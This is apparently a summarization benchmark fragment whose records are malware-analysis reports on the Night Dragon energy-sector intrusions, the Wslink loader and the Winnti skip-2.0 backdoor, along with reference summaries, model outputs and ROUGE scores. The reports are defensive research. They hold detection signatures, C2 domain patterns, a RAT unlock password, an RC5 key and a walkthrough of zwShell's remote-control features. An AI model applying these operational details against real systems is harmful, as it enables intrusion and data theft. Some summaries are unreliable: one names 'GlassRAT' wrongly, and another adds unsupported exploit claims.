& Abel tool to crack the hashes to leverage them in targeting ever more sensitive infrastructures.Files of interest focused on operational oil and gas field production systems and financial documents related to field exploration and bidding that were later copied from the compromised hosts or via extranet servers. In some cases, the files were copied to and downloaded from company web servers by the attackers. In certain cases, the attackers collected data from SCADA systems.Detection The methods and tools used in these attacks are relatively unsophisticated, as they simply appear to be standard host administration techniques, using standard administrative credentials. This is largely why they are able to evade detection by standard security software and network policies. Since the initial compromises, however, many individual unique signatures have been identified for the Trojan and associated tools by security vendors, including McAfee; yet only through recent analysis and the discovery of common artifacts and evidence correlation have we been able to determine that a dedicated effort has been ongoing for at least two years, and likely as many as four. We can now associate the various signatures to these events.The following artifacts can help to determine whether a company has been compromised:\u2022 Host files and/or registry keys \u2022 Anti-virus alerts \u2022 Network communications7White PaperGlobal Energy Cyberattacks: \u201cNight Dragon\u201dHost Files and Registry KeysUtilityDescriptionCommand & for installing the backdoor on the remote system.The dropper can be run from any directory and is usually executed with PSEXEC or an RDP session. Thus, related Windows Security Event logs provide useful information concerning compromised Active Directory accounts. These logs can be reviewed with Windows Event Log Manager or programs, such as \u201cEvent Log Explorer\u201d or EnCase, which support search capabilities.When executed, the dropper creates a temporary file that is reflected in Windows update logs (KB*.log files in c:\\Windows folder).This is because the Windows Registry is modified by the dropper to create a \u201cnetsvcs\u201d key. Accordingly, the date of the backdoor installation can be determined from a search of the KB log files. This temporary file is also identified in the backdoor DLL itself. The temporary file is usually some alphanumeric combination that includes \u201cgzg\u201d (for example, xgt0gzg); however, it has been seen with generic file names (for example, server.exe) as well.The dropper is deleted when the backdoor is installed, and the temporary file is removed when the computer is restarted. If a backdoor has already been configured on the system, the dropper installation will fail unless it uses a different configuration.Trojan backdoorDynamic link libraries (DLLs), also appearing under many other names.These files have a correlated Windows Registry key that is determined by the dropper when the backdoor is installed. The dropper iterates through the Windows netsvcs registry keys and uses the first available key, indicating the path and filename of the backdoor in a ServiceDLL register. The backdoor operates as a service through a \u201csvchost.exe netsvcs \u2013k\u201d registry setting. The service key can be found under:HKLM\\system\\<controlset>\\services\\The DLL is a system or hidden file, 19 KB to 23 KB in size and includes an XOR-encoded data section that is defined by the C&C application when the dropper is created. It includes the network service identifier, registry service key, service description, mutex name, C&C server address, port, and dropper temporary file name. The backdoor may operate from any configured TCP port.This DLL is specified in the ServiceDLL key in the related Windows netsvcs registry entry. The DLL is usually found in the %System%\\System32 or %System%\\SysWow64 directory.Trojan backdoor 2*startup.dllA6CBA73405C77FEDEAF4722AD7D35D60Initially configured with the following:connect.dll6E31CCA77255F9CDE228A2DB9E2A3855Connect.dll creates the temporary file \u201cHostID.DAT,\u201d which is sent to the C&C server, then downloads and configures related DLLs including:\u2022 PluginFile.dll \u2022 PluginRegedit.dllThereafter \u201cStartup.dll\u201d operates the service under a Windows Registry key. All communications seen so far with this version have been on ports 25 and 80 over TCP but can operate on any determined port. The service key is identified in the DLL (which does not include any encrypted data) as:HKLM\\Software\\RATThis DLL is usually found in the %System%\\System32 directory; however, it has also been found in other locations. The path to the backdoor DLL is indicated in the Windows Registry ServiceDLL key.* This DLL uses a different C&C application that may be an earlier version of zwShell, analysis continues.8White PaperGlobal Energy Cyberattacks: \u201cNight Dragon\u201dThe Trojan components are manually copied or delivered through administrative utilities to remote systems. They do not include any worm or self-replicating features, nor can the Trojan \u201cinfect\u201d other computers. Removing the Trojan components is simply a matter of deleting the related files and registry settings.The Trojan backdoor communicates with the C&C server at the address hard-coded in each DLL. The C&C server cannot modify the backdoor once it is installed; related systems must have the Trojan file removed before a new backdoor DLL can be installed on the system. Thus, if the C&C server address is changed, those servers that have the DLL with previous addresses must be remotely administered by the attacker.Anti-virus Alerts Anti-virus patterns are defined according to samples submitted by clients or analysts as they are discovered. Some Trojans exhibit characteristics of other types of malware, such as worms or viruses, that have the ability to infect other systems. RATs do not typically include such features, and, because they are defined with unique configurations for custom purposes, they commonly change faster than unique samples can be identified.Only when an entire RAT toolkit is found can we define an anti-virus pattern that is generic enough to detect the RAT regardless of configuration changes. The package necessarily includes the C&C application server, the generator utility for creating droppers, related droppers, and backdoors \u2014 and a sufficient number of each to correlate the toolkit.As mentioned previously, there have been several unique patterns developed from samples submitted to McAfee (as well as to other anti-virus vendors).McAfee recommends that companies review McAfee ePolicy Orchestrator\u00ae (McAfee ePO\u2122) software and anti-virus logs for \u201cNightDragon\u201d signature detections to identify related alerts since 2007 and then recover and resubmit these samples for analysis to investigate the related incidents. McAfee can assist with the analysis or provide instructions and tools for internal review.Network Communications Network communications are relatively easy to detect because the malware uses a unique host beacon and server response protocol. Each communication packet between the compromised host and the C&C server is signed with a plain text signature of \u201chW$.\u201d (or \u201c\\x68\\x57\\x24\\x13\u201d) at the byte offset 0x42 within the TCP packet.The backdoor begins its beacon at approximately five-second intervals with an initial packet that may be detected with the pattern: \u201c\\x01\\x50[\\x00-\\xff]+\\x68\\x57\\x24\\x13.\u201d9White PaperGlobal Energy Cyberattacks: \u201cNight Dragon\u201dThe server acknowledges the beacon with an initial response of \u201c\\x01\\x60[\\x00-\\xff]+\\x68\\x57\\x24\\x13.\u201dThe backdoor sends the password to the server in clear text after the server acknowledges the connection.While the backdoor and the server have an active connection, the backdoor will send \u201ckeep-alive\u201d messages that can be detected with: \u201c\\x03\\x50[\\x00-\\xff]+\\x68\\x57\\x24\\x13.\u201d10White PaperGlobal Energy Cyberattacks: \u201cNight Dragon\u201dThe attackers use \u201cdynamic DNS\u201d Internet name services accounts to relay C&C communications or temporarily associate DNS addresses with remote servers. Primary domains that have been used for C&C traffic include (all of these have been used frequently by other malware):\u2022 [xxxx].is-a-chef.com \u2022 [xxxx].thruhere.net \u2022 [xxxx].office-on-the.net \u2022 [xxxx].selfip.comNote: The above hostnames (is-a-chef.com<url thruhere.net<url office- on-the.net<url selfip.com<url by themselves do not indicate malicious activity and there are plenty of legitimate subdomains that may use those hostnames. Communication to those hostnames should be carefully scrutinized but not necessarily raise alarm on its ownCompany extranet servers have also been used as either unique or secondary/redundant C&C servers. In some instances, the attackers have (probably mistakenly) used droppers configured to compromise one company\u2019s computers \u2014 in another company\u2019s computers.McAfee recommends that companies configure intrusion detection system (IDS) rules to detect the noted signatures (or employ the user-defined signature [UDS] \u201cBACKDOOR: NightDragon Communication Detected\u201d in McAfee Network Security Platform) and monitor DNS for outbound communications to dynamic DNS addresses resolving to or pathed back as suballocated to servers in China, where the company\u2019s name or common abbreviation forms the first part of the address. This may be difficult. However, if samples of the backdoor DLLs are found, DNS monitoring can help to identify other compromised hosts in the company network. McAfee also recommends that companies review web or IDS logs for file transfers to addresses registered in China. McAfee can assist with the analysis or provide instructions and tools for internal review.Additional Detection Techniques The backdoor beacons with its corresponding C&C server as long as the related address is active. If the address is abandoned or unreachable, the backdoor stops beaconing after some undetermined interval. When a compromised computer is restarted, however, the beaconing begins again because it is registered as a service in the Windows Registry. Anti-virus may or may not detect the Trojan unless it is beaconing or a full file system scan is performed.McAfee Early Detection Customers can deploy a number of McAfee products to help protect information systems from the Night Dragon attack:\u2022 McAfee Vulnerability Manager: Using agentless discovery and vulnerability checking to assess systemson your network, McAfee Vulnerability Manager is an enterprise-class vulnerability management system that will detect infected Night Dragon systems as well as the security weaknesses in systems that have been compromised. The \u201cwham-apt-nightdragon-detected-v7.fasl3\u201d script will detect this threat remotely on systems.11White PaperGlobal Energy Cyberattacks: \u201cNight Dragon\u201d\u2022 McAfee Policy Auditor: Using agent-based configuration audit checks to determine the most secureconfiguration of a system, McAfee Policy Auditor software detects the security weaknesses in the systems that have been compromised\u2022 McAfee Risk Advisory (MRA): Properly deployed, McAfee Risk Advisor would have allowed administratorsto see the misconfigurations and gap in security coverage that facilitated Night Dragon\u2019s exploitationMcAfee Detection Night Dragon also displays a pattern of correlated activities with an assortment of other software tools that McAfee can assist companies to identify.\u2022 McAfee VirusScan Enterprise: Update your anti-virus .DATs to at least version 6232 and ensure thaton-demand scans are working properly and perform a full file system virus scan. Review McAfee ePO software or anti-virus alerts and network logs for \u201cNightDragon\u201d signature detections to identify compromised systems. Please submit any related samples to virus_research@mcafee.com or submit on the web at url\u2022 McAfee Network Threat Response: McAfee Network Threat Response technology would have detectedthe malicious C&C traffic and would have alerted administrators to the attack early, giving them time to react and prevent future damageAdministrators can also download the following free tools from McAfee:\u2022 McAfee \u201cNight Dragon Vulnerability Scanner\u201d based on McAfee Vulnerability Manager technology toscan their networks for the presence of malware\u2022 McAfee Labs StingerMcAfee Prevention For complete prevention of this and most other attacks involving advanced persistent threats (APTs), customers can deploy application whitelisting and change/configuration control software on their critical servers. These technologies completely prevent the unauthorized running of DLLs/EXEs as well as the modification of registry keys, services, and more involved in all of today\u2019s APT and zero-day attacks.\u2022 McAfee Application Control: McAfee Application Control software stops Night Dragon by not allowing the dropper files from executing (even as administrator on Windows), thereby preventing downloads of additional malware and the setup of C&C channels that allowing RAT control and theft of sensitive files\u2022 McAfee Configuration Control: McAfee Configuration Control software allows you to disallowany configuration changes to your systems, protecting them from being modified without explicit permission (even with administrative access)\u2022 McAfee Database Activity Monitoring: delivers complete database protection including 0-day attacksand web born attacks such as those seen with SQL injection in Night Dragon.\u2022 McAfee Network Security Platform: blocks malicious network activity such as APT command andcontrol traffic.\u2022 McAfee Enterprise Firewall: Properly installed and configured at the border and inside your organization,McAfee Firewall would have prevented the Night Dragon operation from penetrating so deeply into the affected organizations and would have blocked C&C communication from the RAT\u2022 McAfee Web Gateway: Properly installed and configured, McAfee Web Gateway would have preventedthe Night Dragon operation from using their RATs, requiring them to proxy-enable their RATs or use alternative proxy-enabled RATs\u2022 McAfee Endpoint Encryption: Properly installed and configured, McAfee Endpoint Encryption softwarereduces the impact of the Night Dragon attack by restricting access to the core targeted assets12White PaperGlobal Energy Cyberattacks: \u201cNight Dragon\u201d\u2022 McAfee Data Loss Protection: Properly installed and configured, McAfee Network DLP and/or McAfeeHost DLP solutions allow you to prevent and detect the extraction of sensitive information from outside the company\u2022 McAfee Host Intrusion Prevention 8.0: McAfee Host Intrusion Prevention 8.0 software has introduced a new \u201cTrustedSource\u201d APT detection feature that allows enterprises to correlate endpoint executable activity with the network C&C communication to detect and prevent RAT communications and data exfiltration activity\u2022 McAfee VirusScan\u00ae Enterprise: In addition to detecting associated malware and RATs on the endpoint,customers can also leverage access protection features in McAfee VirusScan Enterprise to prevent (and alert on) the creation of Night Dragon-related files and folder structures. Other built-in features such infection tracing and McAfee Global Threat Intelligence\u2122 can assist with the identification and quarantining or removal of new and unknown associated malware and RATs.If you have discovered the presence of Night Dragon in your environment and would like incident-response or forensics assistance to respond and repair, please contact Foundstone Professional Services on incidentresponse@foundstone.com or submit any related samples to Virus_Research@avertlabs.com or on the web at McAfee Labs WebImmune.Conclusion Well-coordinated, targeted attacks such as Night Dragon, orchestrated by a growing group of malicious attackers committed to their targets, are rapidly on the rise. These targets have now moved beyond the defense industrial base, government, and military computers to include global corporate and commercial targets. While Night Dragon attacks focused specifically on the energy sector, the tools and techniques of this kind can be highly successful when targeting any industry. Our experience has shown that many other industries are currently vulnerable and are under continuous and persistent cyberespionage attacks of this type. More and more, these attacks focus not on using and abusing machines within the organizations being compromised, but rather on the theft of specific data and intellectual property. It is vital that organizations work proactively toward protecting the heart of their value: intellectual property. Enterprises need to take action to discover these assets in their environments, assess their configurations for vulnerabilities, and protect them from misuse and attack.For additional research and information, review Hacking Exposed: Network Secret and Solutions \u2014 6th Edition (Osborne McGraw-Hill). You can also visit url for information on advanced hacker techniques and to sign up for \u201cHacking Exposed\u201d monthly webinars.Credits and Acknowledgements The preceding white paper was a collaborative effort among numerous people and entities including McAfee Foundstone Professional Services consultants, McAfee Labs, McAfee employees, executives, and researchers, HBGary and National Cyber-Forensics & Training Alliance (NCFTA). Significant contributors include Shane Shook, Dmitri Alperovitch, Stuart McClure, Georg Wicherski, Greg Hoglund, Shawn Bracken, Ryan Permeh, Vitaly Zaytsev, Mark Gilbert, Mike Spohn, George Kurtz, and Adam Meyers.13White PaperGlobal Energy Cyberattacks: \u201cNight Dragon\u201dAppendix A: zwShell \u2014 the RAT Below is a walk-through of the capabilities of zwShell and a demonstration of how the attackers used zwShell as a command and control server to exfiltrate data from within the targeted companies.1. When zwShell is launched, it presents a fake crash error to the user and contains a hidden text entryfield below the \u201cWrite of address 00000000. Process stopped\u201d line. By entering the password in the hidden dialog box above the \u201cok\u201d button to launch the application requires typing a special password, \u201czw.china.\u201d Without that password, the tool will not start. This obfuscation method is likely used to confuse investigators about the true purpose of this executable.2. Once the error is bypassed, and zwShell is launched, it allows the attacker to create a custom Trojan by selecting the Server menu or to launch the C&C server by clicking Start and entering the port to listen for traffic with the password used by the backdoor DLLs. Once started, the application will begin listening for incoming compromised client connections and display them inside the grid. The attacker can launch as many instances of the zwShell application as required \u2014 as long as each listens to a different port or password. In this manner, multiple \u201cnetworks\u201d of compromised computers can be monitored.3. The attacker can also click on the Options menu to configure the C&C server settings. Those settingsinclude selection of the listening port, the password that will encrypt the C&C traffic (which must match the password selected at the time of the Trojan generation), the ability to specify custom sound notifications for when infected machines connect and disconnect from the C&C server, and the ability to increase the color depth used for remote access to the machine, as well as an optional capability to allow resumes of interrupted file transfers from the client machine. The attacker can stop the listener and start with new options to monitor or connect with other compromised computers.14White PaperGlobal Energy Cyberattacks: \u201cNight Dragon\u201d4. The attacker can specify the password (which must match the password set up for the server in Step 3), the name and path to the RAT DLL that will be injected into the svchost.exe Windows services process, the service and mutex names, and service displayed name and description. The attacker can also specify up to two C&C hostnames or IP address, port address, and dropper EXE process icon. Once the Create button is clicked, zwShell will generate a custom EXE dropper process which, when executed, will delete itself and extract a RAT DLL that will be launched as a persistent Windows service. The RAT will then immediately send a beacon on the configured port to the designated C&C server and wait for instructions.5. The dropper will be copied over network shares to the compromised computer and remotely executewith psexec or via Windows Terminal Services (RDP). In some cases, an \u201cAT.job\u201d or \u201cSchTasks\u201d entry will be used to execute the dropper over the network on the compromised computer. When executed, the dropper will create a temporary file and extract a RAT DLL that will be launched as a persistent Windows service. The RAT will then immediately send a beacon on the configured port to the designated C&C server and wait for instructions. The dropper will automatically delete itself after the backdoor service is created, and the temporary file will be deleted when the system is rebooted. An entry will be created in the Windows Update logs (KB****.log) in the C:\\Windows directory with the date and time and path+name of the temporary file.15White PaperGlobal Energy Cyberattacks: \u201cNight Dragon\u201d6. When a client is executed, it connects to the attacker\u2019s zwShell interface, along with its IP address, PC name, name of the logged-in user, and information about the operating system (OS) version of the machine, including the major patch levels.7. The attacker in charge of the C&C server can establish full remote control of the connected machine and can browse the file system, launch command-line shells, manipulate the registry, view the remote desktop, and uninstall the Trojan from the client.8. Browsing the client file system is a fully interactive process and has a familiar user interface similarto Windows Explorer. Individual files and folders can be deleted, renamed, copied, downloaded, and uploaded to the remote machine.16White PaperGlobal Energy Cyberattacks: \u201cNight Dragon\u201d9. A remote command-line shell can be launched to execute commands directly on the remote machine.When the attacker uses this function, a copy of CMD.EXE is copied to the compromised system in a Windows %Temp% directory with the filename svchost.exe. This copy is an unmodified version of the Microsoft Windows command shell executable.10. The Registry can also be viewed and edited in a user interface similar to the Windows Registry editor.17White PaperGlobal Energy Cyberattacks: \u201cNight Dragon\u201dAppendix B: Attribution IMPORTANT: McAfee has no direct evidence to name the originators of these attacks but rather has provided circumstantial evidence.While we believe many actors have participated in these attacks, we have been able to identify one individual who has provided the crucial C&C infrastructure to the attackers \u2014 this individual is based in Heze City, Shandong Province, China. Although we don\u2019t believe this individual is the mastermind behind these attacks, it is likely this person is aware or has information that can help identify at least some of the individuals, groups, or organizations responsible for these intrusions.Figure 6. Shandong Province, ChinaThe individual runs a company that, according to the company\u2019s advertisements, provides \u201dHosted Servers in the U.S. with no records kept\u201d for as little as 68 RMB (US$10) per year for 100 MB of space. The company\u2019s U.S.-based leased servers have been used to host the zwShell C&C application that controlled machines across the victim companies.Beyond the connection to the hosting services reseller operation, there is other evidence indicating that the attackers were of Chinese origin. Beyond the curious use of the \u201czw.china\u201d password that unlocks the operation of the zwShell C&C Trojan, McAfee has determined that all of the identified data exfiltration activity occurred from Beijing-based IP addresses and operated inside the victim companies weekdays from 9:00 a.m. to 5:00 p.m. Beijing time, which also suggests that the involved individuals were \u201ccompany men\u201d working on a regular job, rather than freelance or unprofessional hackers. In addition, the attackers employed hacking tools of Chinese origin and that are prevalent on Chinese underground hacking forums. These included Hookmsgina and WinlogonHack, tools that intercept Windows logon requests and hijack usernames and passwords.18White PaperGlobal Energy Cyberattacks: \u201cNight Dragon\u201dFigure 7. Instructions on the use of WinlogonHack tool by its Chinese developers.On the compromised web server, they also deployed ASPXSpy, a web-based remote administration tool, also of Chinese origin.Figure 8. Parts of the ASPXSpy code with attribution to the Chinese developer.There is nothing to suggest that the developers of these tools had any direct connection to these intrusions, as the tools are widely available on the Chinese web forums and tend to be used extensively by Chinese hacker groups. Although it is possible that all of these indicators are an elaborate red-herring operation designed to pin the blame for the attacks on Chinese hackers, we believe this to be highly unlikely. Further, it is unclear who would have the motivation to go to these extraordinary lengths to place the blame for these attacks on someone else. We have strong evidence suggesting that the attackers were based in China.McAfee, Inc. 2821 Mission College Boulevard Santa Clara, CA 95054 888 847 8766 www.mcafee.comThe information in this document is provided only for educational purposes and for the convenience of McAfee customers. The information contained herein is subject to change without notice, and is provided \u201cas is,\u201d without guarantee or warranty as to the accuracy or applicability of the information to any specific situation or circumstance. McAfee, the McAfee logo, McAfee Labs, McAfee Foundstone, McAfee ePolicy Orchestrator, McAfee ePO, McAfee Global Threat Intelligence, and McAfee VirusScan Enterprise are registered trademarks or trademarks of McAfee or its subsidiaries in the United States and other countries. Other marks and brands may be claimed as the property of others. Copyright \u00a9 2011 McAfee 21401wp_night-dragon_0211 ", "generated_text": "the report; anatomy; a cyberattack; 2009; China; the attacks; System; intrusions; remote admin tools; remote access; attacks; geocache; intrusion detection; malware; the attackers; users; Intrusion; routers; the malware; exploits; Microsoft Windows; Active Directory; unique user credentials; time; DLL; the exploit; a unique key; the system; the network; RATs; RAT detection; Zero-Day; the malware; IP; domains; IP addresses; other organizations; the Night Dragon operation; protections; confidentiality; summary; the techniques; attacks; the cyberattacks.", "ref_text": "<START-1>The document analyzes a series of cyberattacks called \"Night Dragon\" targeting global energy and petrochemical companies starting in late 2009. The attacks originated primarily from China and involved the following: Compromise of company extranet web servers via SQL injection to gain remote access. Upload of hacker tools to pivot further into corporate networks. Cracking of passwords to gain authenticated access to more systems. Disabling of IE proxy settings to allow direct C2 communication. Installation of remote access trojans (RATs) like zwShell for data exfiltration. Focus on operational data like oil field bids and process control systems. The zwShell RAT tool allowed the attackers to build custom malware for victims and control compromised systems. The attacks went undetected for years using basic hacking techniques. Network, registry, and file indicators are provided to detect GlassRAT. McAfee products like Vulnerability Manager, EPO, and Network Security Platform can also identify the threat. Attribution suggests the attacks originated from China based on malware tools, passwords, data exfiltration times, infrastructure, and individuals providing hosting services. The report aims to provide insights to detect and prevent similar future cyber espionage campaigns. In summary, Night Dragon demonstrates advanced persistent threat tactics by nation-state actors against critical infrastructure with the goal of stealing sensitive data. <END-1>", "t5/keyword/hint_hit_precision": 0.25, "t5/word/hint_hit_recall": 0.07281553398058252, "gpt3/lexical/rouge_rouge1": 0.4537313432835821, "gpt3/lexical/rouge_rouge2": 0.09009009009009009, "gpt3/lexical/rouge_rougeL": 0.21492537313432833, "gpt3/lexical/rouge_rougeLsum": 0.21492537313432833, "gpt3_generated_text": ["The report details a cyberattack that began in 2009 and has been targeting global energy companies, primarily originating in China. The attackers have been using a variety of techniques, including exploiting vulnerabilities in Microsoft Windows and Active Directory, using remote administration tools (RATs) for remote access, and exfiltrating sensitive data. The attackers have compromised company infrastructure through methods such as SQL injection and password cracking, gaining access to internal systems and sensitive information. The attackers have also utilized unique user credentials and malware to infiltrate networks and exfiltrate data, with the ability to disable proxy settings to communicate directly with infected machines. The report highlights the need for organizations to strengthen their protections against cyberattacks, including intrusion detection and malware prevention, to safeguard confidentiality and prevent further intrusions."]}, {"split_name": "val", "sample_id": "val_22", "prompt_text": "Extract the keywords: Wslink: Unique and undocumented malicious loader that runs as a serverwelivesecurity.com/2021/10/27/wslink-unique-undocumented-malicious-loader-runs-serverOctober 27, 2021ESET researchers have discovered a unique and previously undescribed loader for Windows binaries that, unlike other such loaders, runs as a server and executes received modules in memory. We have named this new malware Wslink after one of its DLLs.We have seen only a few hits in our telemetry in the past two years, with detections in Central Europe, North America, and the Middle East. The initial compromise vector is not known; most of the samples are packed with MPRESS and some parts of the code are virtualized. Unfortunately, so far we have been unable to obtain any of the modules it is supposed to receive. There are no code, functionality or operational similarities that suggest this is likely to be a tool from a known threat actor group.The following sections contain analysis of the loader and our own implementation of its client, which was initially made to experiment with detection methods. This client\u2019s source code might be of interest to beginners in malware analysis \u2013 it shows how one can reuse and interact with existing functions of previously analyzed malware. The very analysis could also serve as an informative resource documenting this threat for blue teamers.Technical analysisWslink runs as a service and listens on all network interfaces on the port specified in the ServicePort registry value of the service\u2019s Parameters key. The preceding component that registers the Wslink service is not known. Figure 1 depicts the code accepting incoming connections to that port.1/8Figure 1. Hex-Rays decompilation of the loop accepting incoming connectionsAccepting a connection is followed by an RSA handshake with a hardcoded 2048-bit public key to securely exchange both the key and IV to be used for 256-bit AES in CBC mode (see Figure 2). The encrypted module is subsequently received with a unique identifier \u2013 signature \u2013 and an additional key for its decryption.Interestingly, the most recently received encrypted module with its signature is stored globally, making it available to all clients. One can save traffic this way \u2013 transmit only the key if the signature of the module to be loaded matches the previous one.2/8Figure 2. Hex-Rays decompilation of receiving the module and its signatureAs seen in Figure 3, the decrypted module, which is a regular PE file, is loaded into memory using the MemoryModule library and its first export is finally executed. The functions for communication, socket, key and IV are passed in a parameter to the export, enabling the module to exchange messages over the already established connection.3/8Figure 3. Hex-Rays decompilation of code executing the received module in memoryImplementation of the clientOur own implementation of a Wslink client, described below, simply establishes a connection with a modified Wslink server and sends a module that is then decrypted and executed. As our client cannot know the private key matching the public key in any given Wslink server instance, we produced our own key pair and modified the server executable with the public key from that pair and used the private key in our Wslink client implementation.This client enabled us to reproduce Wslink\u2019s communication and search for unique patterns; it additionally confirmed our findings, because we could mimic its behavior.Initially some functions for sending/receiving messages are obtained from the original sample (see Figure 4) \u2013 we can use them right away and do not have to reimplement them later.Figure 4. The code for loading functions from a Wslink\u2019s sample4/8Subsequently, our client reads the private RSA key to be used from a file and a connection to the specified IP and port is established. It is expected that an instance of Wslink already listens on the supplied address and port. Naturally, its embedded public key must also be replaced with one whose private key is known.Our client and the Wslink server continue by performing the handshake that exchanges the key and IV to be used for AES encryption. This consists of three steps, as seen in Figure 5: sending a client hello, receiving the symmetric key with IV, and sending them back to verify successful decryption. From reversing the Wslink binary we learned that the only constraint of the hello message, apart from size 240 bytes, is that the second byte must be zero, so we just set it to all zeroes.Figure 5. Our client\u2019s code for the RSA handshakeThe final part is sending the module. As one can see in Figure 6, it consists of a few simple steps:receiving the signature of the previously loaded module \u2013 we decided not to do anything with it in our implementation, as it was not important for us sending a hardcoded signature of the module reading the module from a file, encrypting it (see Figure 7) and sending it sending the encryption key of the module5/8Figure 6. Our client\u2019s code for sending the moduleFigure 7. Our client\u2019s code for loading and encrypting the moduleThe full source code for our client is available in our WslinkClient GitHub repository. Note that the code still requires a significant amount of work to be usable for malicious purposes and creating another loader from scratch would be easier.6/8ConclusionWslink is a simple yet remarkable loader that, unlike those we usually see, runs as a server and executes received modules in memory.Interestingly, the modules reuse the loader\u2019s functions for communication, keys and sockets; hence they do not have to initiate new outbound connections. Wslink additionally features a well-developed cryptographic protocol to protect the exchanged data.IoCsSamplesSHA-1ESET detection name01257C3669179F754489F92947FBE0B57AEAE573 Win64/TrojanDownloader.WslinkE6F36C66729A151F4F60F54012F242736BA2486239C4DE564352D7B6390BFD50B28AA9461C93FB32MITRE ATT&CK techniquesThis table was built using version 9 of the ATT&CK framework.TacticEnterpriseIDNameDescriptionT1587.001 Develop Capabilities:MalwareWslink is a custom PE loader.ExecutionT1129Shared ModulesT1569.002 System Services: Service ExecutionWslink loads and executes DLLs in memory.Wslink runs as a service.Obfuscated ControlT1027.002 Obfuscated Files orInformation: Software PackingWslink is packed with MPRESS and its code might be virtualized.T1573.001 Encrypted Channel:Symmetric CryptographyT1573.002 Encrypted Channel:Asymmetric CryptographyWslink encrypts traffic with AES.Wslink exchanges a symmetric key with RSA.7/88/8 ", "generated_text": "ESET researchers; a unique and previously undescribed loader; Windows binaries; a server; modules; memory; incoming connections; RSA; signature; transmission; the module; commands; the client; a connection; the Wslink server; the initial compromise vector; no code; functionality; operational similarities; a known threat actor; this new malware; this threat actor; blue teamers; the loader; the source code; the loader; the malware; detection; its client; the compromise vector; the initial compromise vector; the samples; MPRESS; part; the code; virtualized modules; Decoy; the loader; the modules; security.", "ref_text": "<START-1>The PDF describes a new and unique malware loader called Wslink discovered by ESET researchers. Wslink runs as a service on compromised Windows systems and listens on a specified port for incoming connections. Unlike other loaders, Wslink executes received modules directly in memory rather than writing them to disk. It uses a sophisticated cryptographic protocol involving RSA and AES encryption to securely receive and decrypt modules from a command and control server. After establishing a connection, Wslink performs an RSA key exchange to securely transmit a symmetric AES key. The encrypted module is then sent along with a signature and decryption key. The decrypted module is loaded into memory using a library and its export function executed. Modules can reuse Wslink's communication functions to send data over the existing socket. The most recent module and signature are stored globally, allowing the C2 to just send the decryption key for previously sent modules. ESET has seen limited detections of Wslink in Europe, North America, and the Middle East. The initial infection vector is unknown. Samples are packed and code virtualized, hampering analysis. No links to known threat groups have been found. ESET implemented a Wslink client to connect to a modified server and send modules, confirming the protocol and aiding detection methods. The client source code may help beginners in malware analysis by interacting with real malware functions. In summary, Wslink is a sophisticated loader implementing novel techniques like server-based module loading and an RSA-AES encrypted communication protocol. While current impact is low, its capabilities highlight continuing evolution of malware loader tactics. <END-1>", "t5/keyword/hint_hit_precision": 0.225, "t5/word/hint_hit_recall": 0.04980842911877394, "gpt3/lexical/rouge_rouge1": 0.44386422976501305, "gpt3/lexical/rouge_rouge2": 0.12073490813648294, "gpt3/lexical/rouge_rougeL": 0.24543080939947778, "gpt3/lexical/rouge_rougeLsum": 0.24543080939947778, "gpt3_generated_text": ["ESET researchers have identified a unique and previously undocumented loader for Windows binaries named Wslink, which operates as a server and executes received modules in memory. The malware utilizes RSA encryption for secure communication and transmission of modules with unique signatures. The loader listens on a specified port for incoming connections and stores the most recent module globally for efficient transmission. Analysis of the loader's code reveals its functionality and operational methods, with no clear links to known threat actor groups. A client implementation was developed to interact with the server, enabling the decryption and execution of modules. This research provides valuable insights for malware analysis and detection, offering a detailed examination of this new and sophisticated threat."]}, {"split_name": "val", "sample_id": "val_23", "prompt_text": "Extract the keywords: Winnti Group\u2019s skip\u20112.0: A Microsoft SQL Server backdoorwelivesecurity.com/2019/10/21/winnti-group-skip2-0-microsoft-sql-server-backdoorOctober 21, 2019Notorious cyberespionage group debases MSSQLMathieu Tartare 21 Oct 2019 - 11:30AM For a while, ESET researchers have been tracking the activities of the Winnti Group, active since at least 2012 and responsible for high-pro\ufb01le supply-chain attacks against the video game and software industry. Recently, we discovered a previously undocumented backdoor targeting Microsoft SQL (MSSQL) that allows attackers to maintain a very discreet foothold inside compromised organizations. This backdoor bears multiple similarities to the PortReuse backdoor, another tool used by the Winnti Group that was \ufb01rst documented by ESET in October 2019, such as the use of the same custom packer and VMProtected launcher, which is why we attribute this backdoor to the Winnti Group.Earlier this year, we received a sample of this new backdoor called skip-2.0 by its authors and part of the Winnti Group\u2019s arsenal. This backdoor targets MSSQL Server 11 and 12, allowing the attacker to connect stealthily to any MSSQL account by using a magic password \u2013 while automatically hiding these connections from the logs. Such a backdoor could allow an attacker to stealthily copy, modify or delete database content. This could be used, for example, to manipulate in-game currencies for \ufb01nancial gain. In-game currency database manipulations by Winnti operators have already been reported. To the best of our knowledge, skip-2.0 is the \ufb01rst MSSQL Server backdoor to be documented publicly. Note that even though MSSQL Server 11 and 12 are not the most recent versions (released in 2012 and 2014, respectively), they are the most commonly used ones according to Censys\u2019s data.We recently published a white paper updating our understanding of the arsenal of the Winnti Group, and that exposed a previously undocumented backdoor of theirs called PortReuse. It uses an identical packer to that used with the payload embedded in compromised video games uncovered by ESET in March 2019. The VMProtected launcher that drops the PortReuse backdoor was also found being used to launch recent ShadowPad versions. In that context, we were able to \ufb01nd a new tool called skip.2-0 by its developer. It uses the same VMProtected launcher as well as Winnti Group\u2019s custom packer and exhibits multiple similarities with other samples from the Winnti Group\u2019s toolset. This leads us to ascribe skip-2.0 to that toolset also.This article will focus on the technical details and functionality of this MSSQL Server backdoor, as well as on exposing the technical similarities of skip.2-0 with the Winnti Group\u2019s known arsenal \u2013 in particular, with the PortReuse backdoor and ShadowPad. A note on the reasons why we chose the \u201cWinnti Group\u201d naming can be found on our white paper. VMProtected launcherurl Group\u2019s skip2.0: A Microsoft SQL Server backdoor | WeLiveSecurityWe found skip-2.0 while looking for VMProtected launchers, for which the payload is usually either PortReuse or ShadowPad. Embedded payload As with the encrypted PortReuse and ShadowPad payloads, skip-2.0 is embedded in the VMProtected launcher\u2019s overlay, as shown in Figure 1:Figure 1. VMProtected launcher\u2019s headers. The payload is embedded in the PE overlay.Encryption The payload encryption is identical to that used in the other VMProtected launchers. It is RC5- encrypted with a key derived from the VolumeID and the string f@Ukd!rCto R$., as described in our previous white paper on the Winnti Group arsenal. Persistence As in the case of PortReuse and ShadowPad, the launcher probably persists by exploiting a DLL hijacking vulnerability by being installed at C:\\Windows\\System32\\TSVIPSrv.DLL. This results in the DLL being loaded by the standard Windows SessionEnv service at system startup. Winnti Group\u2019s custom packer Once decrypted the embedded payload is actually Winnti Group\u2019s custom packer. This packer is the same shellcode that was documented in our previous article and white paper. It is used to pack the PortReuse 